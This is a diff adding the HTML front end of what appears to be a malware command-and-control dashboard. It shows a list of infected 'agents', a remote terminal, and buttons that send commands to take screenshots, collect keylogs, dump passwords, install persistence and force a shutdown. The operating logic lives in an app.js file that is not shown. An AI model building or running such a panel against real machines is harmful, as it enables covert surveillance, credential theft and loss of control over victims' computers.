@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 DASHBOARD</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1>C2 // DASHBOARD</h1>
+        <div class="status-indicator">● ONLINE</div>
+    </header>
+
+    <main>
+        <!-- Sidebar: Agents List -->
+        <section id="agents-panel">
+            <div class="panel-header">AGENTS</div>
+            <div id="agents-list">
+                <!-- Agent items will be injected here -->
+            </div>
+        </section>
+
+        <!-- Main Content: Details & Terminal -->
+        <section id="content-panel">
+            
+            <!-- Empty State -->
+            <div id="empty-state">
+                <p>&lt; SELECT AN AGENT &gt;</p>
+            </div>
+
+            <!-- Active Agent Dashboard -->
+            <div id="agent-dashboard">
+                <div class="dashboard-toolbar">
+                    <button class="btn" onclick="sendCommand('whoami')">[INFO]</button>
+                    <button class="btn" onclick="sendCommand('!screenshot')">[SCREENSHOT]</button>
+                    <button class="btn" onclick="sendCommand('!keys')">[KEYLOGS]</button>
+                    <button class="btn" onclick="sendCommand('!dumppass')">[DUMP PASS]</button>
+                    <button class="btn" onclick="sendCommand('dir')">[DIR]</button>
+                    <button class="btn" onclick="sendCommand('ipconfig')">[NET]</button>
+                    <button class="btn" onclick="sendCommand('!persist')">[PERSIST]</button>
+                    <button class="btn btn-danger" onclick="sendCommand('shutdown /s /t 0')">[KILL]</button>
+                </div>
+
+                <div id="terminal-container">
+                    <!-- Logs will be injected here -->
+                </div>
+
+                <div id="command-bar">
+                    <span style="padding: 5px; color: #555;">&gt;</span>
+                    <input type="text" id="cmd-input" placeholder="Enter command..." autocomplete="off">
+                </div>
+            </div>
+
+        </section>
+    </main>
+
+    <script src="app.js"></script>
+</body>
+</html>
